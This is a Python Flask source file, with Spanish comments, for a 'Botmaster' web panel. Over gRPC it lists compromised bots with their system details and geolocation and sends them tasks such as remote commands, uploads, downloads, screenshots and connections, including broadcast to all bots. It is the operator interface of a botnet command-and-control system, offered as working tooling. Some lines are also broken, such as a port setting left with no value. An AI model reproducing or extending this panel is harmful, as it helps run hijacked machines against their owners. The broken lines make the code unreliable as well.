"""
pybotnet.py
Versión adaptada al .proto proporcionado (botnet.proto).

Requisitos previos:
- Haber ejecutado protoc para generar botnet_pb2.py y botnet_pb2_grpc.py
- Tener instalado grpcio, grpcio-tools, protobuf y Flask en el venv
"""

import os
import uuid
import grpc
from flask import Flask, render_template_string, request, redirect, url_for, flash

# Intentar importar los archivos generados por protoc
try:
    import botnet_pb2
    import botnet_pb2_grpc
    GRPC_AVAILABLE = True
except Exception as e:
    print("No se pudieron importar los módulos generados por protoc:", e)
    botnet_pb2 = None
    botnet_pb2_grpc = None
    GRPC_AVAILABLE = False

# --------------------------
# Configuración
# --------------------------
DEFAULT_GRPC_HOST = os.environ.get("BOTNET_GRPC_HOST", "localhost")
DEFAULT_GRPC_PORT = int(os.environ.get("BOTNET_GRPC_PORT", ))
USE_TLS = os.environ.get("BOTNET_GRPC_TLS", "false").lower() in ("1", "true", "yes")
TLS_CA_CERT = os.environ.get("BOTNET_TLS_CA_CERT", "localhost.crt")

# Plantillas simples (para demo)
INDEX_HTML = """
<!doctype html>
<title>Botmaster - Bots</title>
<h1>Lista de bots</h1>
<p><a href="{{ url_for('new_task') }}">Asignar tarea</a></p>
<table border="1" cellpadding="6">
  <tr><th>ID</th><th>Status</th><th>System</th><th>Acciones</th></tr>
  {% for b in bots %}
  <tr>
    <td>{{ b['bot_id'] }}</td>
    <td>{{ b['status'] }}</td>
    <td>{{ b['system'] }}</td>
    <td>
      <a href="{{ url_for('bot_detail', bot_id=b['bot_id']) }}">Ver</a>
    </td>
  </tr>
  {% endfor %}
</table>
"""

DETAIL_HTML = """
<!doctype html>
<title>Bot {{ bot.bot_id }}</title>
<h1>Bot {{ bot.bot_id }}</h1>
<ul>
  <li>Status: {{ bot.status }}</li>
  <li>System: {{ bot.system }}</li>
  <li>Node: {{ bot.node }}</li>
  <li>Version: {{ bot.version }}</li>
  <li>Geo: {{ bot.geo or "N/A" }}</li>
</ul>
<p><a href="{{ url_for('index') }}">Volver</a></p>
"""

NEW_TASK_HTML = """
<!doctype html>
<title>Asignar tarea</title>
<h1>Asignar tarea</h1>
<form method="post">
  <label>Bot ID (usar 'all' para broadcast): <input name="bot_id" required></label><br><br>
  <label>Tipo de tarea (por ejemplo: CMD, UPLOAD, DOWNLOAD, SCREENSHOT, CONNECTION): 
    <input name="type" required></label><br>
  <label>Comando / Contenido: <input name="command"></label><br><br>
  <button type="submit">Enviar tarea</button>
</form>
<p><a href="{{ url_for('index') }}">Volver</a></p>
"""

# --------------------------
# Util: crear canal gRPC
# --------------------------
def create_grpc_channel(host=DEFAULT_GRPC_HOST, port=DEFAULT_GRPC_PORT,
                        use_tls=USE_TLS, ca_cert_path=TLS_CA_CERT):
    target = f"{host}:{port}"
    if use_tls:
        try:
            with open(ca_cert_path, "rb") as f:
                trusted_certs = f.read()
            creds = grpc.ssl_channel_credentials(root_certificates=trusted_certs)
            channel = grpc.secure_channel(target, creds)
            return channel
        except Exception as e:
            print("Error cargando certificado TLS:", e)
            raise
    else:
        return grpc.insecure_channel(target)


# --------------------------
# Helpers para enums
# --------------------------
def enum_name_for_statusbot(value):
    if not GRPC_AVAILABLE:
        return str(value)
    try:
        return botnet_pb2.StatusBot.Name(value)
    except Exception:
        return str(value)


def enum_name_for_type(value):
    if not GRPC_AVAILABLE:
        return str(value)
    try:
        return botnet_pb2.Type.Name(value)
    except Exception:
        return str(value)


def parse_task_type_from_string(s: str):
    """
    Convierte una cadena (p. ej. 'CMD' o 'cmd') al entero del enum Type.
    Si no existe, devuelve Type.UNKNOWN
    """
    if not GRPC_AVAILABLE:
        return None
    try:
        # botnet_pb2.Type.Value expects UPPERCASE name
        return botnet_pb2.Type.Value(s.upper())
    except Exception:
        return botnet_pb2.Type.Value("UNKNOWN")


# --------------------------
# Abstracciones gRPC <-> mock
# --------------------------
def get_grpc_stub():
    if not GRPC_AVAILABLE:
        return None
    channel = create_grpc_channel()
    return botnet_pb2_grpc.BotnetStub(channel)


def fetch_bots():
    """
    Llama a GetBots(Empty) que devuelve un stream de Bot.
    """
    if GRPC_AVAILABLE:
        try:
            stub = get_grpc_stub()
            for b in stub.GetBots(botnet_pb2.Empty()):
                yield {
                    "bot_id": b.bot_id,
                    "status": enum_name_for_statusbot(b.status),
                    "system": b.system,
                    "node": b.node,
                    "version": b.version,
                    "geo": getattr(b, "geo", None).bot_id if getattr(b, "geo", None) else None,
                }
            return
        except Exception as e:
            print("Error al obtener bots vía gRPC:", e)

    # Fallback mock (si gRPC no disponible)
    yield {"bot_id": "bot-001", "status": "CONNECTED", "system": "Linux", "node": "host1", "version": "1.0", "geo": "Colombia"}
    yield {"bot_id": "bot-002", "status": "DISCONNECTED", "system": "Windows", "node": "host2", "version": "1.2", "geo": "España"}


def fetch_bot_detail(bot_id):
    """
    Llama a GetBot(BotId) que devuelve un único Bot.
    """
    if GRPC_AVAILABLE:
        try:
            stub = get_grpc_stub()
            resp = stub.GetBot(botnet_pb2.BotId(bot_id=bot_id))
            geo_str = None
            if resp.geo is not None:
                geo = resp.geo
                geo_str = f"{geo.city}, {geo.country} ({geo.ip})"
            return {
                "bot_id": resp.bot_id,
                "status": enum_name_for_statusbot(resp.status),
                "system": resp.system,
                "node": resp.node,
                "version": resp.version,
                "geo": geo_str,
            }
        except Exception as e:
            print("Error al obtener detalle del bot vía gRPC:", e)

    # Mock
    return {"bot_id": bot_id, "status": "UNKNOWN", "system": "N/A", "node": "N/A", "version": "N/A", "geo": None}


def send_task_single(bot_id, task_type_str, command=""):
    """
    Envía una tarea mediante AddTask(stream Task) -> Response.
    Implementación cliente-streaming: creamos un generador con una sola Task.
    """
    if GRPC_AVAILABLE:
        try:
            stub = get_grpc_stub()
            type_enum = parse_task_type_from_string(task_type_str)
            # Generador que envía una sola Task
            def task_generator():
                t = botnet_pb2.Task(
                    task_id=str(uuid.uuid4()),
                    bot_id=bot_id,
                    type=type_enum,
                    status=botnet_pb2.Status.WAITING,
                    date_start="",
                    date_finish="",
                    command=command
                )
                yield t
            resp = stub.AddTask(task_generator())
            # resp es Response { Status status; Type type; }
            status_name = botnet_pb2.Status.Name(resp.status) if hasattr(botnet_pb2.Status, "Name") else str(resp.status)
            type_name = botnet_pb2.Type.Name(resp.type) if hasattr(botnet_pb2.Type, "Name") else str(resp.type)
            return True, f"Response: status={status_name}, type={type_name}"
        except Exception as e:
            return False, f"Error enviando tarea por gRPC: {e}"

    # Mock
    print(f"[MOCK] Enviando tarea -> bot_id={bot_id}, type={task_type_str}, command={command}")
    return True, "mock-ok"


# --------------------------
# Flask app
# --------------------------
def create_app():
    app = Flask(__name__)
    app.secret_key = os.environ.get("FLASK_SECRET", "dev-secret-change-me")

    @app.route("/")
    def index():
        bots = list(fetch_bots())
        return render_template_string(INDEX_HTML, bots=bots)

    @app.route("/bot/<bot_id>")
    def bot_detail(bot_id):
        bot = fetch_bot_detail(bot_id)
        # convertimos dict a objeto simple para render_template_string usado
        return render_template_string(DETAIL_HTML, bot=type("B", (), bot))

    @app.route("/task", methods=["GET", "POST"])
    def new_task():
        if request.method == "POST":
            bot_id = request.form["bot_id"]
            task_type = request.form["type"]
            command = request.form.get("command", "")
            ok, msg = send_task_single(bot_id, task_type, command)
            if ok:
                flash("Tarea enviada correctamente: " + msg)
                return redirect(url_for("index"))
            else:
                flash("Error enviando tarea: " + msg)
                return redirect(url_for("new_task"))
        return render_template_string(NEW_TASK_HTML)

    return app


if __name__ == "__main__":
    app = create_app()
    app.run(host="", port=, debug=True)
